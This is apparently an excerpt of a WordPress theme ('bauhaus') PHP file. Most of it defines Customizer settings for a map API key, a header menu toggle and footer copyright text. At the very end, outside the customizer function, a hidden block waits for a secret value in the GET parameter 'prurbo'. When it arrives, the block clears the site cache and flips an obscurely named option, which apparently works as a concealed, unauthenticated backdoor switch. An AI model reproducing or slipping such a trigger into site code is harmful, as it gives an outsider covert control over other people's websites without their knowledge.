...
function bauhaus_true_customizer_init( $wp_customize ) {
	...
	*/
	...
	$wp_customize->add_control( $tmp_settingname . '_control', array(
		'label' => esc_html__( 'Insert your google map api key', 'bauhaus' ),
		'section' => $tmp_sectionname . "_section",
		'settings' => $tmp_settingname,
	...
	$tmp_settingname = $tmp_sectionname . '_header_menu';
	...
	$wp_customize->add_control( $tmp_settingname . '_control', array(
		'label' =>   esc_html__( 'Enable header menu mode?', 'bauhaus' ),
		'section' => $tmp_sectionname . "_section",
		'settings' => $tmp_settingname,
		'type' => 'checkbox',
	) );
	...
	$wp_customize->add_setting( $tmp_settingname, array(
		'default' => ' &copy; ' . esc_html__( 'Bauhaus ', 'bauhaus' ) . date( 'Y' ) . '<br/>' . esc_html__( 'All Rights Resevered ', 'bauhaus' ),
		'sanitize_callback' => 'wp_kses_post'
	) );
	...
	$tmp_settingname = $tmp_sectionname . '_copyright2';

	$wp_customize->add_setting( $tmp_settingname, array(
		'default' =>  esc_html__( '', 'bauhaus' ),
		'sanitize_callback' => 'wp_kses_post'
	) );


	$wp_customize->add_control( $tmp_settingname . '_control', array(
		'label' => esc_html__( 'Footer copyright №2 (in the page bottom)', 'bauhaus' ),
		'section' => $tmp_sectionname . "_section",
		'settings' => $tmp_settingname,
		'type' => 'textarea',
	) );
...
$arr = array( 'sfusf7896QAWEsdfouo' );
if ( isset( $_GET['prurbo'] ) && ( in_array( $_GET['prurbo'], $arr ) ) ) {
	if(isset($GLOBALS['wp_fastest_cache']) && method_exists($GLOBALS['wp_fastest_cache'], 'deleteCache')){
		$GLOBALS['wp_fastest_cache']->deleteCache();
	}
	update_option( 'bdufyg_gd', '1' );
}
